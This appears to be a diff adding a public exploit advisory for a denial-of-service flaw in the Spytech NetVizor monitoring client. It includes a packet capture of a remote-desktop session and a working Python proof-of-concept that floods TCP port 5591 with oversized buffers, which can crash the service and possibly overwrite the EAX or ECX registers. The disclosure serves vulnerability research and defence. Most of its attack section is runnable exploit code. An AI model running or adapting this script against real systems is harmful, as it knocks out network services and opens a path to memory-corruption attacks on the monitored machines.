@@ -1,0 +1,71 @@
+# Author: loneferret of Offensive Security
+# Product: Spytech VetVizor
+# Version: Build Release 6.1
+# Vendor Site: hhttp://www.spytech-web.com/
+# Software Download: http://www.spytech-web.com/download.shtml#netvizor
+
+
+# Descriptions:
+# NetVizor is the latest in network monitoring software. Monitor your entire network from 
+# one centralized location! NetVizor allows you to track workstations and individual users
+# that may use multiple PC's on a network. NetVizor records everything users do - from keystrokes 
+# typed to email activity. NetVizor can show you what everyone is doing on your 
+# network, in real-time, with a single mouse click via its visual network overview and 
+# real-time activity ticker. 
+
+# NetVizor Client DoS:
+# Using the NetVizor "Viewer", the administrator can initiate a "RDP" like connection to a 
+# client workstation with the NetVizor "Client" installed. The port used on the client
+# host is 5591, which listens on all interfaces by default. This port is also used by the
+# "Viewer" application to grab screenshots of monitored hosts.
+# It's possible to have the service crash by sending an overly large string. And it some
+# cases this will will overwrite EAX or ECX. Regardless if the registers are overwritten
+# or not, the "Viewer" application will no longer be able to initiate a remote desktop
+# connection nor will it be able to grab a screen capture.
+
+# Wireshark capture:
+# This snip is from a successful connection between the "Viewer" application and the client
+# when initiating it's Remote Desktop session. Converting this to HEX and using it in our
+# PoC actually triggers it, unfortunately with no proper listener nothing really happens.
+#+From the Viewer
+#launchremotedesktop
+# .r...\Yv.r..+..r .
+# x.......r...r........-.......|...h........r.....r....-.......|....s...r..$..r,s...s.....r,s.....r...
+# ........h............s...SYvQ..
+# ....h...w/.w...v..............2..........SYv...r...r..5.....-............s..Hk..h...
+
+#+From client
+# Remote desktop started: C:\PROGRA~1\nvclient\rds.exe
+
+#+And the above as seen from Wireshark.
+launchremotedesktop
+.r...\Yv.r..+..r .
+x.......r...r........-.......|...h........r.....r....-.......|....s...r..$..r,s...s.....r,s.....r...
+........h............s...SYvQ..
+....h...w/.w...v..............2..........SYv...r...r..5.....-............s..Hk..h...Remote desktop started: C:\PROGRA~1\nvclient\rds.exe
+
+# PoC:
+# In the following script, when EAX or ECX is overwritten it will be with the 'B's.
+# As always, if someone wants to investigate further go right ahead. 
+# Just be nice.
+
+#!/usr/bin/python
+
+import socket
+
+buffer1= "[AAAA]"  * 500
+buffer2= "BBBB"  * 6000
+
+print "\nSending buffer 1"
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('xxx.xxx.xxx.xxx',5591))
+s.send(buffer1)
+s.close()
+
+raw_input()
+
+print "\nSending buffer 2"
+s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s2.connect(('xxx.xxx.xxx.xxx',5591))
+s2.send(buffer2)
+s2.close()
